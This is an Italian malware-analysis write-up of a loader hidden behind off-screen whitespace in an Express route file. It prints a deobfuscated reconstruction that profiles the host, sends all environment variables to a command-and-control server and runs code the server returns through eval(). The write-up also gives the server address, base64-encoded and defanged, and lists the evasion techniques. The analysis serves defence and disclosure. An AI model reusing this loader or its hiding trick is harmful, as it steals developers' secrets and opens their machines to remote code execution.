# 02 — Livello 1: il loader in `routes/api/auth.js`

## Dove si nasconde

Il payload è appeso in fondo a un file di routing Express apparentemente normale. Le righe 1–16 sono codice legittimo (login + validazione). Alla **riga 17**, dopo **centinaia di spazi bianchi** che spingono il codice fuori dallo schermo, c'è un blob offuscato in stile `obfuscator.io` (variabili `_0x…`, array di stringhe ruotato, indici esadecimali). Subito dopo, `module.exports = router;`.

```js
router.post('/', [...], login);
                              ⟵ centinaia di spazi ⟶   (function(_0x481bac,_0xd92d3e){…MALWARE…})(…);
module.exports = router;
```

L'indentazione forzata è una tecnica anti-review: in un diff o in un editor senza word-wrap la riga sembra vuota.

## Cosa fa — deoffuscato

Ricostruzione leggibile del blob:

```js
const os = require('os');
let sysId = 0;

// 1) Profilazione della vittima
function getSystemInfo() {
  return {
    hostname: os.hostname(),
    macs: [ /* MAC della prima interfaccia IPv4 non interna, != 00:00:00:00:00:00 */ ],
    os: `${os.type()} ${os.release()} (${os.platform()})`,
  };
}

// 2) Beacon al C2 + esecuzione della seconda fase
async function sendRequest(sysInfo) {
  try {
    const params = new URLSearchParams({
      sysInfo:     JSON.stringify(sysInfo),
      processInfo: JSON.stringify(process.env),   // ⚠️ TUTTE le variabili d'ambiente
      tid:         'bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=', // base64 = "now it time to get everything"
      sysId:       sysId,                          // id vittima assegnato dal C2
    });

    // URL del C2 in base64 per nasconderlo
    const url = Buffer.from(
      'aHR0cDovLzIxNi4yNTAuMjUxLjE4NzoxMjI0L2FwaS9jaGVja1N0YXR1cw==',
      'base64').toString('utf8');  // → hxxp://216[.]250[.]251[.]187:1224/api/checkStatus

    const res = await fetch(url + '?' + params);
    const { status, message, sysId: newId } = await res.json();

    if (status === 'success') {
      try { eval(message); } catch (e) {}   // ⚠️⚠️ RCE: esegue codice arbitrario dal C2
    }
    if (newId) sysId = newId;
  } catch (e) { console.error(e); }
}

// 3) Avvio immediato + ripetizione ogni 5 secondi
try {
  const s = getSystemInfo();
  sendRequest(s);
  setInterval(() => sendRequest(s), 5000);   // 0x1388 ms
} catch (e) { console.error(e); process.exit(1); }
```

## Stringhe decodificate

| Offuscato (base64) | Reale |
|---|---|
| `aHR0cDovLzIxNi4yNTAuMjUxLjE4NzoxMjI0L2FwaS9jaGVja1N0YXR1cw==` | `hxxp://216[.]250[.]251[.]187:1224/api/checkStatus` |
| `bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=` (`tid`) | `now it time to get everything` |

Il `tid` è l'**identificativo di campagna** dell'operatore.

## Quando parte

Il blob è codice **top-level** del modulo: viene eseguito al `require()` del router, cioè **all'avvio del server** (`node server.js`). Non serve che nessuno chiami l'endpoint di login — basta avviare l'app una volta.

## Dati esfiltrati in questa fase

- `os.hostname()`, tipo/release/piattaforma OS, indirizzo MAC;
- **l'intero `process.env`** → su una macchina di sviluppo include tipicamente `JWT_SECRET`, `MONGO_URI` (credenziali DB), token API, chiavi cloud, segreti CI/CD — tutto **in chiaro su HTTP non cifrato**.

## Perché è efficace (defense evasion)

- offuscamento `obfuscator.io` (array ruotato a runtime fino a far quadrare un checksum);
- URL e `tid` in base64;
- payload nascosto da indentazione fuori schermo;
- la seconda fase non è mai su disco → poco materiale per gli AV statici.

Sample isolato e *defanged*: [`samples/stage1/`](../samples/stage1/).
